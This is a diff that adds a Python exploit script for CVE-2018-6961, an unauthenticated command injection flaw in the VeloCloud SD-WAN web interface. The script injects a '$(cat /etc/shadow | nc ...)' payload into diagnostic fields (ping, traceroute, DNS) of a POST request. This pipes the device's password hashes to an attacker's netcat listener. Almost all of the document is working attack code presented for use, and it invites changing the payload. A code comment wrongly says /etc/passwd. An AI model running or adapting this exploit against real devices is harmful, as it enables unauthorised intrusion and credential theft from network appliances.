@@ -1,0 +1,89 @@
+#!/usr/bin/env python
+ 
+# Exploit Title: Unauthenticated Command Injection vulnerability in VMware NSX SD-WAN by VeloCloud
+# Date: 2018-06-29
+# Exploit Author: paragonsec @ Critical Start
+# Credit: Brian Sullivan from Tevora and Section 8 @ Critical Start
+# Vendor Homepage: https://www.vmware.com
+# Security Advisory: https://www.vmware.com/security/advisories/VMSA-2018-0011.html
+# Version: 3.1.1 
+# CVE: CVE-2018-6961
+ 
+import argparse
+import requests
+import sys
+import collections
+ 
+'''
+This script will return execute whatever payload you placed within it. 
+Keep in mind that SD-WAN is running a slimmed down Linux version so obtaining a reverse shell isn't as simple as nc -e /bin/bash blah blah
+The command within this script will send stdout of commands to your netcat listener. Feel free to change :)
+'''
+
+#Colors
+OKRED = '\033[91m'
+OKGREEN = '\033[92m'
+ENDC = '\033[0m'
+
+parser = argparse.ArgumentParser()
+parser.add_argument("--rhost", help = "Remote Host")
+parser.add_argument("--source", help = "Victim WAN Interface (e.g ge1, ge2)")
+parser.add_argument('--lhost', help = 'Local Host listener')
+parser.add_argument('--lport', help = 'Local Port listener')
+parser.add_argument('--func', help = 'Function to abuse (e.g traceroute, ping, dns)')
+args = parser.parse_args()
+
+# Check to ensure at least one argument has been passed
+if len(sys.argv)==1:
+    parser.print_help(sys.stderr)
+    sys.exit(1)
+
+rhost = args.rhost
+source = args.source
+lhost = args.lhost
+lport = args.lport
+func = args.func
+
+# Payload to be sent to the victim. Change to whatever you like!
+# This payload will cat /etc/passwd from fictim and pipe it into a netcat connection to your listener giving you the contents of /etc/passwd
+payload = "$(cat /etc/shadow |nc " + lhost + " " + lport + ")"
+
+exploit_url = "http://" + rhost + "/scripts/ajaxPortal.lua"
+ 
+headers = [
+    ('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0'),
+    ('Accept', 'application/json, text/javascript, */*; q=0.01'),
+    ('Accept-Language', 'en-US,en;q=0.5'),
+    ('Accept-Encoding', 'gzip, deflate'),
+    ('Referer','http://' + rhost + '/'),
+    ('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8'),
+    ('X-Requested-With', 'XMLHttpRequest'),
+    ('Cookie', 'culture=en-us'),
+    ('Connection', 'close')
+]
+ 
+# probably not necessary but did it anyways
+headers = collections.OrderedDict(headers)
+ 
+# Setting up POST body parameters
+if func == 'traceroute':
+    body = "destination=8.8.8.8" + payload + "&source=" + source + "&test=TRACEROUTE&requestTimeout=900&auth_token=&_cmd=run_diagnostic"
+elif func == 'dns':
+    body = "name=google.com" + payload + "&test=DNS_TEST&requestTimeout=90&auth_token=&_cmd=run_diagnostic"
+else:
+    body = "destination=8.8.8.8" + payload + "&source=" + source + "&test=BASIC_PING&requestTimeout=90&auth_token=&_cmd=run_diagnostic"
+
+print(OKGREEN + "Author: " + ENDC + "paragonsec @ Critical Start (https://www.criticalstart.com)")
+print(OKGREEN + "Credits: " + ENDC + "Brian Sullivan @ Tevora and Section 8 team @ Critical Start")
+print(OKGREEN + "CVE: " + ENDC + "2018-6961")
+print(OKGREEN + "Description: " + ENDC + "Multiple Unauthenticated Command Injection Vulnerabilities in VeloCloud SD-WAN GUI Application\n")
+	
+print(OKGREEN + "[+]" + ENDC + "Running exploit...")
+
+s = requests.Session()
+
+req = requests.post(exploit_url, headers=headers, data=body)
+if "UNKNOWN_COMMAND" not in req.text:
+    print(OKGREEN + "[+]" + ENDC + "Exploit worked. Check listener!")
+else:
+    print(OKRED + "[!]" + ENDC + "Exploit failed. You lose!")
